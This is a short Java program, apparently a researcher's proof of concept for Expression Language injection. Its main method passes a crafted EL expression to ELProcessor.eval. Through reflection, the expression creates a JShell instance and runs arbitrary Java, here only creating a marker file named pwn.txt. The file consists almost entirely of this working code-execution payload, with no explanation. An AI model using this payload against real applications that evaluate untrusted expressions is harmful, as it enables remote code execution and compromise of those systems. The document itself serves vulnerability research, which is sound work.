import javax.el.ELProcessor;
import java.io.IOException;

public class Main {
    public static void main(String[] args) throws IOException {
        ELProcessor elProcessor = new ELProcessor();
        String payload = "{\"\".getClass().forName(\"jdk.jshell.JShell\").getMethod(\"create\").invoke(null).eval(\"java.nio.file.Files.createFile(java.nio.file.Paths.get(\\\"/Users/GEBIRGE/Research/pwn.txt\\\"))\")}";

        try {
            Object result = elProcessor.eval(payload);
            System.out.println("Result of expression '" + payload+ "': " + result);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}